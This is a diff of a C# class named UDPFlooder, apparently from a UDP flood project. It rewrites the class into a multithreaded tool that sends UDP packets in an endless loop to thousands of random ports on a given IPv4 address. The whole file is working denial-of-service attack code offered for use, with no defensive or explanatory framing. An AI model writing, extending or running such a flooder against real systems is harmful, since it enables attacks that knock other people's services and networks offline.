@@ -1,61 +1,86 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
+using System.Text;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
-using System.Threading.Tasks;
+using System.Threading;
+using System.Linq;
 
 namespace UDPFlood.Flooder;
 
 public sealed class UDPFlooder
 {
     public bool IsFlooderWorking { get; private set; }
-    public string Address { get; }
-
-    public UDPFlooder(string address)
-    {
-        Address = address;
-    }
+    public IPAddress Address { get; }
+    public int Threads { get; }
 
     public event EventHandler<int>? PacketSended;
-    public event EventHandler<int>? PortClosed;
+
+    public UDPFlooder(string address, int threads)
+    {
+        if (threads <= 0 || threads > 9)
+            throw new ArgumentOutOfRangeException(nameof(threads));
+
+        if (!IPAddress.TryParse(address, out var ipAddress) || ipAddress.AddressFamily != AddressFamily.InterNetwork)
+            throw new ArgumentOutOfRangeException(nameof(address));
+
+        Threads = threads;
+        Address = ipAddress;
+    }
+
+    public void Stop() => IsFlooderWorking = false;
 
     public void Start()
     {
         IsFlooderWorking = true;
 
-        var ports = new List<int>();
+        var ports = GenerateRandomPorts(Threads * 1000, 1, 49150);
+        var srcPorts = GenerateRandomPorts(Threads, 49001, 49150);
 
-        var rnd = new Random();
+        var threads = new List<Thread>();
 
-        for (int i = 0; i < 100; i++)
+        for (int i = 0; i < srcPorts.Count; i++)
         {
-            ports.Add(rnd.Next(1000, 40000));
-
-            while (ports.FindIndex(x => x == ports[i]) != i)
-                ports[i] = rnd.Next(1000, 40000);
+            var src = srcPorts[i];
+            var distPorts = ports.Skip(i * Threads).Take(1000);
+            threads.Add(new Thread(() => Flood(src, distPorts)));
         }
 
-        SendPackets(ports, 100000);
+        foreach (var thread in threads)
+            thread.Start();
     }
 
-    private void SendPackets(IEnumerable<int> ports, int packetCount)
+    private void Flood(int srcPort, IEnumerable<int> ports)
     {
-        var udpClient = new UdpClient();
+        using var udpClient = new UdpClient(srcPort);
 
-        for (int i = 0; i < packetCount; i++)
+        while (IsFlooderWorking)
         {
+            var message = Guid.NewGuid().ToString();
+            var bytes = Encoding.UTF8.GetBytes(message);
+
             foreach (var port in ports)
             {
-                var message = Guid.NewGuid().ToString();
-                var bytes = Encoding.UTF8.GetBytes(message);
-                var point = new IPEndPoint(IPAddress.Parse(Address), port);
+                var point = new IPEndPoint(Address, port);
                 udpClient.Send(bytes, point);
-
                 PacketSended?.Invoke(this, port);
             }
         }
+    }
 
+    private static List<int> GenerateRandomPorts(int count, int min, int max)
+    {
+        var rnd = new Random();
+        var ports = new List<int>();
+
+        for (int i = 0; i < count; i++)
+        {
+            ports.Add(rnd.Next(min, max));
+
+            while (ports.FindIndex(x => x == ports[i]) != i)
+                ports[i] = rnd.Next(min, max);
+        }
+
+        return ports;
     }
 }
